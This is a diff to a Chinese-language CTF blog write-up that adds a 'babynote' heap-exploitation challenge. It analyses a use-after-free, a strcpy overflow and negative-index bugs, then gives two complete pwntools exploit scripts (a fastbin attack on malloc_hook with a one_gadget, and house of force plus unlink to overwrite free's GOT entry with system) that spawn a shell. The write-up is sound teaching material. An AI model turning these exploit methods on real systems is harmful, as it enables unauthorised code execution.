@@ -121,7 +121,7 @@
                   
                   &nbsp;<i class="far fa-chart-bar"></i>
                   <span class="post-count">
-                    3.2k 字
+                    4.6k 字
                   </span>&nbsp;
                 
 
@@ -129,7 +129,7 @@
                   
                   &nbsp;<i class="far fa-clock"></i>
                   <span class="post-count">
-                      17 分钟
+                      24 分钟
                   </span>&nbsp;
                 
 
@@ -693,6 +693,234 @@ itr()
 # 0xf1207 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)
 # constraints:
 #   [rsp+0x70] == NULL</code></pre>
+<h2 id="babynote"><a href="#babynote" class="headerlink" title="babynote"></a>babynote</h2><h3 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h3><h4 id="regist"><a href="#regist" class="headerlink" title="regist()"></a>regist()</h4><pre><code class="c"> strcpy(name, &amp;s);                             </code></pre>
+<pre><code class="c"> __isoc99_scanf(&quot;%lld&quot;, &amp;age1); // 长整数</code></pre>
+<p>可能造成溢出。在栈中，其下面紧挨着age。</p>
+<p><img src="http://qiqianyun.chumen77.xyz/uPic/n2fCnS.png" srcset="/img/loading.gif" alt></p>
+<p>在bss段，其下面紧挨着heap存放的地址。</p>
+<h4 id="addnote"><a href="#addnote" class="headerlink" title="addnote()"></a>addnote()</h4><ul>
+<li>只能申请6个堆。</li>
+<li>申请了一个堆，其size放在距离其堆地址·<code>6 * 8</code>的位置。</li>
+<li>可以根据堆序号申请堆，判断堆序号是否存在的依据：此堆对应的size位有没有数值（也适用于shownote，deletenote,editnote）<h4 id="deletenote"><a href="#deletenote" class="headerlink" title="deletenote()"></a>deletenote()</h4></li>
+</ul>
+<pre><code class="c">if ( v1 &lt;= 3 )                                // 可以输入负数
+  {
+    if ( *(_QWORD *)&amp;m[4 * (v1 + 0xALL)] )
+    {
+      free(*(void **)&amp;m[4 * (v1 + 4LL)]);// 反编译错了 是8 *（xx）
+      *(_QWORD *)&amp;m[4 * (v1 + 0xALL)] = 0LL;//uaf heap没有清0,size 清0
+      puts(&quot;Done!&quot;);
+    }</code></pre>
+<ul>
+<li>存在uaf</li>
+<li>只能删除<code>idx&lt;=3</code> 的堆</li>
+<li>可以输入负堆号，可以根据其逻辑来删除一些特殊的堆</li>
+</ul>
+<h4 id="editnote"><a href="#editnote" class="headerlink" title="editnote()"></a>editnote()</h4><pre><code class="c">if ( v1 &lt;= 3 &amp;&amp; v1 &gt;= 0 )</code></pre>
+<ul>
+<li>只能编辑前4个堆</li>
+</ul>
+<h3 id="攻击思路-1"><a href="#攻击思路-1" class="headerlink" title="攻击思路"></a>攻击思路</h3><ul>
+<li>leak libc</li>
+<li>free(-1) free(-2) 删除掉motto name的堆块</li>
+<li>利用reset，调用regist，利用strcpy来溢出age的数值，控制第一个chunk的size，造成一个堆块重叠</li>
+<li>删除0、1、2chunk，申请一个大的chunk，可以覆盖到chunk 1的fd从而修改，进行fastbin attack</li>
+<li>打malloc hook 为 one gadget</li>
+</ul>
+<h3 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *
+import time
+local_file  = &#39;./babynotes&#39;
+elf = ELF(local_file)
+context.log_level = &#39;debug&#39;
+debug = 1
+if debug:
+    io = process(local_file)
+    libc = elf.libc
+else:
+    io = remote(&#39;node3.buuoj.cn&#39;,27411)
+    libc = elf.libc
+    #libc = ELF(&#39;.&#39;)
+context.arch = elf.arch
+context.terminal = [&#39;tmux&#39;,&#39;neww&#39;]
+#,&#39;&#39;splitw&#39;,&#39;-h&#39;
+rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]
+s      = lambda data               :io.send(data) 
+sa      = lambda delim,data         :io.sendafter(delim, data)
+sl      = lambda data               :io.sendline(data)
+sla     = lambda delim,data         :io.sendlineafter(delim, data)
+r      = lambda numb=4096          :io.recv(numb)
+ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)
+uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))
+uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))
+info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))
+itr     = lambda                    :io.interactive()
+def debug():
+    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)
+    gdb.attach(io)
+    pause()
+
+def reg(name,motto,age):
+    sa(&#39;name&#39;,str(name))
+    sa(&#39;motto&#39;,str(motto))
+    sla(&#39;age&#39;,str(age))
+
+def add(idx,size):
+    sla(&#39;&gt;&gt;&#39;,&#39;1&#39;)
+    sla(&#39;dex&#39;,str(idx))
+    sla(&#39;size&#39;,str(size))
+
+def show(idx):
+    sla(&#39;&gt;&gt;&#39;,&#39;2&#39;)
+    sla(&#39;dex&#39;,str(idx))
+
+def free(idx):
+    sla(&#39;&gt;&gt;&#39;,&#39;3&#39;)
+    # if int(idx) &lt;=3:
+    sla(&#39;dex&#39;,str(idx))
+    # if int(idx) &gt;3:
+        # idx = 
+
+def edit(idx,data):
+    sla(&#39;&gt;&gt;&#39;,&#39;4&#39;)
+    sla(&#39;dex&#39;,str(idx))
+    sa(&#39;note&#39;,str(data))
+
+def reset(name,motto,age):
+    sla(&#39;&gt;&gt;&#39;,&#39;5&#39;)
+    reg(name,motto,age)
+
+name = &#39;a&#39; * 0x18
+motto = &#39;b&#39; * 0x20
+age = 0x100
+reg(name,motto,age)
+add(0,0x58) 
+add(1,0x68) 
+add(2,0x68)
+add(3,0x100) 
+add(4,0x18) 
+free(3)
+add(5,0x68)
+show(5)
+ru(&#39;ote 5: &#39;)
+libc_base = uu64(r(6)) - 0x3c4c78
+info_addr(&#39;libc&#39;,libc_base)
+
+free(-1)
+free(-2)
+age = 0x1111111100000141
+reset(name,&#39; &#39;,age)
+free(0)
+free(1)
+free(2)
+add(0,0x100)
+malloc_hook = 0x3c4aed + libc_base
+payload = 11 * p64(0) + p64(0x71) + p64(malloc_hook)
+edit(0,payload)
+add(1,0x68)
+add(2,0x68)
+add(3,0x68)
+one = 0xf0364 + libc_base
+payload = (0x13-8) * &#39;1&#39; + p64(0) + p64(one)
+edit(3,payload)
+free(3)
+itr()</code></pre>
+<p>还有一种思路，就是因为bss段的age，free（-3）也可以进行free的，控制其为一个0x68堆块地址的话，就可以出现一个0x70的fastbin块，然后其size是不会北抹除的，所以利用uaf直接edit其fd为malloc hook，fastbin attack 攻击即可。</p>
+<h3 id="另一种打法"><a href="#另一种打法" class="headerlink" title="另一种打法"></a>另一种打法</h3><h4 id="addnote-1"><a href="#addnote-1" class="headerlink" title="addnote()"></a>addnote()</h4><pre><code class="c">   puts(&quot;Input note size: &quot;);
+      __isoc99_scanf(&quot;%lld&quot;, &amp;size);
+      if ( (signed __int64)size &lt;= 0x100 )
+      {</code></pre>
+<p>这里有个遗漏点，add的size是可以输入负的</p>
+<h4 id="house-of-force使用条件"><a href="#house-of-force使用条件" class="headerlink" title="house of  force使用条件"></a>house of  force使用条件</h4><p>比赛时没有想到，因为house of  force相关的有点遗忘了。</p>
+<ul>
+<li>可以溢出到top chunk的 size，篡改 size 为一个很大值,就可以轻松的通过top chunk的相关验证，常见就是修改为 <code>-1</code> </li>
+<li>可以申请任意size的堆块，正负都行，但是有不同的攻击限制</li>
+</ul>
+<p>这题是可以满足的:</p>
+<ul>
+<li>利用strcpy来溢出age的数值 ，很简单的控制top chunk的 size</li>
+<li>可以申请负的堆块，负的堆块可以打heap 或者 got ，获取一个任意地址写,<strong>通常应该都是打heap</strong></li>
+</ul>
+<h4 id="攻击思路-2"><a href="#攻击思路-2" class="headerlink" title="攻击思路"></a>攻击思路</h4><ul>
+<li>修改top chunk的size</li>
+<li>利用house of  force，将top chunk向前移动，使得其与现有的chunk重合</li>
+<li>然后通过malloc一个小堆块，构造好 fake chunk，控制现有堆的size和prev_size后_</li>
+<li>做unlink，实现任意地址读写。</li>
+</ul>
+<h4 id="exp-6"><a href="#exp-6" class="headerlink" title="exp"></a>exp</h4><pre><code class="python">#coding:utf8
+from pwn import *
+
+sh = process(&#39;./babynotes&#39;)
+# sh = remote(&#39;123.56.170.202&#39;,43121)
+elf = ELF(&#39;./babynotes&#39;)
+libc = ELF(&#39;/lib/x86_64-linux-gnu/libc-2.23.so&#39;)
+free_got = elf.got[&#39;free&#39;]
+
+def debug():
+    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)
+    gdb.attach(sh)
+    pause()
+context.terminal = [&#39;tmux&#39;,&#39;neww&#39;]
+sh.sendafter(&#39;Input your name:&#39;,&#39;haivk&#39;)
+sh.sendafter(&#39;Input your motto:&#39;,&#39;pwnit&#39;)
+sh.sendlineafter(&#39;Input your age:&#39;,&#39;1&#39;)
+
+def add(index,size):
+   sh.sendlineafter(&#39;&gt;&gt;&#39;,&#39;1&#39;)
+   sh.sendlineafter(&#39;Input index:&#39;,str(index))
+   sh.sendlineafter(&#39;Input note size:&#39;,str(size))
+
+def show(index):
+   sh.sendlineafter(&#39;&gt;&gt;&#39;,&#39;2&#39;)
+   sh.sendlineafter(&#39;Input index:&#39;,str(index))
+
+def delete(index):
+   sh.sendlineafter(&#39;&gt;&gt;&#39;,&#39;3&#39;)
+   sh.sendlineafter(&#39;Input index:&#39;,str(index))
+
+def edit(index,content):
+   sh.sendlineafter(&#39;&gt;&gt;&#39;,&#39;4&#39;)
+   sh.sendlineafter(&#39;Input index:&#39;,str(index))
+   sh.sendafter(&#39;Input your note:&#39;,content)
+
+def reset():
+   sh.sendlineafter(&#39;&gt;&gt;&#39;,&#39;5&#39;)
+
+
+
+add(0,0x100)
+add(1,0x100)
+add(2,0x100)
+
+reset()
+sh.sendafter(&#39;Input your name:&#39;,&#39;haivk&#39;.ljust(0x18,&#39;a&#39;))
+sh.sendafter(&#39;Input your motto:&#39;,&#39;pwnit&#39;)
+sh.sendlineafter(&#39;Input your age:&#39;,&#39;-1&#39;)
+
+add(4,-0x370)
+add(3,0x20)
+#top chunk上移
+edit(3,p64(0x100) + p64(0x110))
+heap0_ptr_addr = 0x6020E0
+edit(0,p64(0) + p64(0x101) + p64(heap0_ptr_addr - 0x18) + p64(heap0_ptr_addr - 0x10))
+debug()
+#unlink
+delete(1)
+
+debug()
+edit(0,p64(0)*3 + p64(free_got))
+show(0)
+sh.recvuntil(&#39;Note 0: &#39;)
+free_addr = u64(sh.recv(6).ljust(8,&#39;\x00&#39;))
+libc_base = free_addr - libc.sym[&#39;free&#39;]
+system_addr = libc_base + libc.sym[&#39;system&#39;]
+edit(0,p64(system_addr))
+edit(2,&#39;/bin/sh\x00&#39;)
+#getshell
+delete(2)
+
+sh.interactive()
+</code></pre>
+<p>exp 来自 haivk 大师傅。</p>
 
             <hr>
           </div>
@@ -704,9 +932,9 @@ itr()
               <span>
                 <i class="iconfont icon-tag"></i>
                 
-                  <a class="hover-with-bg" href="/tags/pwn">pwn</a>
-                
                   <a class="hover-with-bg" href="/tags/re">re</a>
+                
+                  <a class="hover-with-bg" href="/tags/pwn">pwn</a>
                 
               </span>
             
